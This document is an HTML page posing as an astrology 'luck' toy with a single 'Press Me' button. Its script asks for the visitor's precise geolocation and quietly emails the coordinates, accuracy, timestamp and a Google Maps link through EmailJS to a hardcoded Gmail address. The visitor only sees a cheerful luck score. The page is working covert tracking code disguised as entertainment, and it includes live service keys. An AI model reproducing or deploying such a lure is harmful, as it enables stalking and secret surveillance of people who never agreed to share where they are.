<!doctype html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <title>Luck Through Stars And Astrology</title>

  <script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js"></script>

  <style>
    body {
      font-family: Arial, sans-serif;
      max-width: 500px;
      margin: 60px auto;
      padding: 20px;
      text-align: center;
    }

    h1 {
      margin-bottom: 25px;
    }

    button {
      display: block;
      margin: 20px auto;
      padding: 16px 35px;
      font-size: 20px;
      font-weight: bold;
      cursor: pointer;
      border: none;
      border-radius: 8px;
      background-color: #4b2aad;
      color: white;
    }

    button:hover {
      background-color: #351d82;
    }

    button:disabled {
      cursor: not-allowed;
      opacity: 0.6;
    }

    #status {
      margin-top: 20px;
    }
  </style>
</head>

<body>
  <h1>Luck</h1>

  <button id="locationButton">
    Press Me
  </button>

  <p>
    Find Luck Through Stars
  </p>

  <p id="status"></p>

  <script>
    const EMAILJS_PUBLIC_KEY = "vdXmhe_duYHT5y0qd";
    const EMAILJS_SERVICE_ID = "service_a3e3yq5";
    const EMAILJS_TEMPLATE_ID = "template_01cyemm";

    emailjs.init({
      publicKey: EMAILJS_PUBLIC_KEY
    });

    const button = document.getElementById("locationButton");
    const status = document.getElementById("status");

    button.addEventListener("click", requestLocation);

    function requestLocation() {
      if (!navigator.geolocation) {
        status.textContent =
          "Geolocation is not supported by this browser.";
        return;
      }

      button.disabled = true;
      status.textContent = "Requesting your location...";

      navigator.geolocation.getCurrentPosition(
        async position => {
          const latitude = position.coords.latitude;
          const longitude = position.coords.longitude;
          const accuracy = Math.round(position.coords.accuracy);
          const time = new Date().toISOString();

          const mapLink =
            `https://www.google.com/maps?q=${latitude},${longitude}`;

          const templateParameters = {
            to_email: "dineshandsons2070@gmail.com",
            latitude: latitude,
            longitude: longitude,
            accuracy: accuracy,
            time: time,
            map_link: mapLink
          };

          console.log("Location data:", templateParameters);

          try {
            await emailjs.send(
              EMAILJS_SERVICE_ID,
              EMAILJS_TEMPLATE_ID,
              templateParameters
            );

            status.textContent =
              "YOUR LUCK TODAY WILL BE 10 OUT OF 10";

            button.disabled = false;
          } catch (error) {
            console.error("EmailJS error:", error);

            status.textContent =
              "Location was received, but the email could not be sent.";

            button.disabled = false;
          }
        },

        error => {
          button.disabled = false;

          if (error.code === 1) {
            status.textContent =
              "Location permission was denied.";
          } else if (error.code === 2) {
            status.textContent =
              "Your location could not be determined.";
          } else if (error.code === 3) {
            status.textContent =
              "The location request timed out.";
          } else {
            status.textContent =
              "An unknown location error occurred.";
          }
        },

        {
          enableHighAccuracy: true,
          timeout: 15000,
          maximumAge: 0
        }
      );
    }
  </script>
</body>
</html>
